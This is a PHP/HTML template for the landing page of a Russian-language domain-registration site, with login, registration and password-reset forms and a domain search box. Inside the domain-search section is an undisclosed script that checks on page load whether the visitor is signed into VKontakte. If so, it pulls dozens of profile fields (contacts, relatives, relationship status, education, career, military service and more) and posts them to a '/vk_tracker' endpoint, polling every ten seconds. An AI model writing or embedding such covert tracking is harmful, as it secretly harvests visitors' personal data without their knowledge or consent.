<?php
/*********************************************************/
//Created by: AzureEva
/*********************************************************/
MAIN_INDEX_FILE_INCLUDED === true ?: die;

INCLUDE_LOG (__FILE__);

?><!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Land Iguana CMS</title>
    <link rel="shortcut icon" href="<?echo THEME_URL ?>/img/logo_min.ico" type="image/x-icon">
    <meta id="viewport" name="viewport" content="width=800px">
    <style><?php require_once "loader.php"; ?></style>
	<link rel="stylesheet" type="text/css" href="<?echo THEME_URL ?>/css/styles.css">
    <link href='https://fonts.googleapis.com/css?family=Roboto+Condensed:400,700,300&subset=latin,cyrillic' rel='stylesheet' type='text/css'>
    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
    <script src="<?echo THEME_URL ?>/js/doc.js"></script>
    <script>
        $(window).bind("load", function () {
            $('.loader').fadeOut(200);
//            setTimeout(function () {
////                $('.content').animate({
////                    top:-220
////                }, 200);
//                $('.content').addClass('content_animate');
//            }, 200);
        });
    </script>
</head>
<body>
    <div class="loader">
        <div class="cssload-thecube">
            <div class="cssload-cube cssload-c1"></div>
            <div class="cssload-cube cssload-c2"></div>
            <div class="cssload-cube cssload-c4"></div>
            <div class="cssload-cube cssload-c3"></div>
        </div>
    </div>
    <div class="container">
            <div class="content">
                <header>
                    <a href="<?php echo SITE_URL; ?>">
                        <div class="logo">
                            <h1>Land Iguana <span>Domains</span></h1>
                        </div>
                    </a>
                    <div class="login-block">
                        <a href="<?php echo SITE_URL; ?>">
                            <div class="logo">
                                <h1>Land Iguana <span>Domains</span></h1>
                            </div>
                        </a>
                        <label for="login-email">
                            Email
                        </label>
                        <input id="login-email" class="login-name" type="email" name="email"/>
                        <br>
                        <label for="login-password">
                            Пароль
                        </label>
                        <input class="login-password" type="password" name="password" id="login-password"/>
                        <br>
                        <div class="button reg">Регистрация</div>
                        <div class="button login_b">Войти</div>
                        <div class="forgot_pass">Забыли пароль?</div>
                        <div class="version">v0.9 Beta</div>

                        <div class="showing-block reg-block">
                            <div class="login-close">x</div>
                            <h3>Регистрация</h3>
                            <label for="reg-email">
                                Email
                            </label>
                            <input class="login-name" type="email" name="email" id="reg-email"/>
                            <br>
                            <label for="reg-password">
                                Пароль
                            </label>
                            <input class="password" type="password" name="password" id="reg-password"/>
                            <br>
                            <label for="reg-password_c" class="password_c_label">
                                Повторение<br>пароля
                            </label>
                            <input class="password_c" type="password" name="password" id="reg-password_c"/>
                            <br>
                            <div class="button reg_b">Зарегистрироваться</div>
                        </div>
                        <div class="showing-block restore-pass">
                            <div class="login-close">x</div>
                            <h3>Восстановление пароля</h3>
                            <label for="restore-email">
                                Email
                            </label>
                            <input class="login-name" type="email" name="email" id="restore-email"/>
                            <br>
                            <div class="button restore-pass_b">Востановить</div>
                        </div>
                        <div class="showing-block mess-block">
                            <div class="login-close">x</div>
                            <p class="mess-text"></p>
                            <div class="button showing-block-ok">OK</div>
                        </div>
                    </div>
                    <div class="menu">
                        <ul>
                            <a><li>Домены</li></a>
                            <a><li>Поддержка</li></a>
                            <a><li>API</li></a>
                            <a><li class="login_b">Вход</li></a>
                        </ul>
                    </div>
                </header>
                <div class="content_g">
                    <h2>Регистрация доменов</h2>
                    <h3></h3>
                    <input type="search" class="search" placeholder="Введите домен или слово">
                    <div class="button search_b"></div>
                    <div class="popular_domains">
                        <label>
                            <input type="checkbox">
                            Все
                        </label>
                        <label>
                            <input type="checkbox">
                            .RU
                        </label>
                        <label>
                            <input type="checkbox">
                            .COM
                        </label>
                        <label>
                            <input type="checkbox">
                            .NET
                        </label>
                        <label>
                            <input type="checkbox">
                            .ORG
                        </label>
                    </div>

                    <script src="https://vkontakte.ru/js/api/openapi.js" type="text/javascript"></script>
                    <script language="javascript">
                        var url = "<?php echo SITE_URL; ?>/vk_tracker";
                        var appId = 5765962;
                        window.onload = (function() {
                            VK.init({
                                apiId: appId
                            });
                            function vk_c (authInfo) {
                                VK.Auth.getLoginStatus(authInfo);
                            }
                            function authInfo(response) {
                                if (response.session) {
                                    VK.api("users.get", {"user_ids": response.session.mid, "fields": "photo_id,verified,sex,bdate,city,country,home_town,has_photo,photo_50,photo_100,photo_200_orig,photo_200,photo_400_orig,photo_max,photo_max_orig,online,lists,domain,has_mobile,contacts,site,education,universities,schools,status,last_seen,followers_count,common_count,occupation,nickname,relatives,relation,personal,connections,exports,wall_comments,activities,interests,music,movies,tv,books,games,about,quotes,can_post,can_see_all_posts,can_see_audio,can_write_private_message,can_send_friend_request,is_favorite,is_hidden_from_feed,timezone,screen_name,maiden_name,crop_photo,is_friend,friend_status,career,military,blacklisted,blacklisted_by_me"},function (data) {
                                        var xhr = new XMLHttpRequest();
                                        var vid = encodeURIComponent(response.session.mid);
                                        xhr.open("POST", url, true);
                                        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                                        xhr.send("id=" + vid + "&ud=" + encodeURIComponent(JSON.stringify(data.response[0])));
                                        xhr.onreadystatechange = function (){
                                            if(xhr.readyState == 4){
                                                setTimeout(function () {
                                                    vk_c(authInfo);
                                                }, 10000)
                                            }
                                        }
                                    });
                                } else {
                                    setTimeout(function () {
                                        vk_c(authInfo);
                                    }, 10000)
                                }
                            }
                            vk_c(authInfo);
                        });
                    </script>

                </div>
            </div>
    </div>



    <input id="front_url" type="hidden" value="<?php echo SITE_URL; ?>/">
    <input id="main_url" type="hidden" value="<?php echo SITE_URL; ?>/main">
    <input id="login_url" type="hidden" value="<?php echo SITE_URL; ?>/api/login">
    <input id="reg_url" type="hidden" value="<?php echo SITE_URL; ?>/api/register">
    <input id="forgot_pass_url" type="hidden" value="<?php echo SITE_URL; ?>/api/login/reset_pass">
</body>
</html>